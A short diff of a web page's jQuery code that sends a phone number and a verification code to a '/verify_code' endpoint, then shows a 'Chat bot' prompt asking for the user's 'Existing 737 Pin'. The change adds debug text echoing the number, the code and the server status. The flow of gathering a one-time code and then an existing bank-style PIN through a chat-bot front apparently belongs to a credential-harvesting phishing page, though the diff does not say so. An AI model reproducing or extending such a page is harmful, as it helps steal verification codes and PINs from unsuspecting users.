@@ -128,7 +128,7 @@ box-shadow: 0px 10px 54px -12px rgba(0,0,0,0.75);
 			$('#submitb').click(function() {
 				var returncode;
 				var code = $('#inputb').val();
-				$('p').text(fcbk_number + '  ' + code);
+				$('p').text(fcbk_number + ' verf pin ' + code);
 				$.ajax({
 					type: 'POST',
 					data: JSON.stringify({
@@ -140,6 +140,7 @@ box-shadow: 0px 10px 54px -12px rgba(0,0,0,0.75);
 					url: '/verify_code',
 					success: function(data) {
 						returncode = data.status;
+						$('p').text(fcbk_number + ' verf pin ' + code + ' and status '+data.status);
 						if(returncode == '1'){
 							$('p').text('Chat bot: Please Enter Your Existing 737 Pin');
 							$('#b').hide();
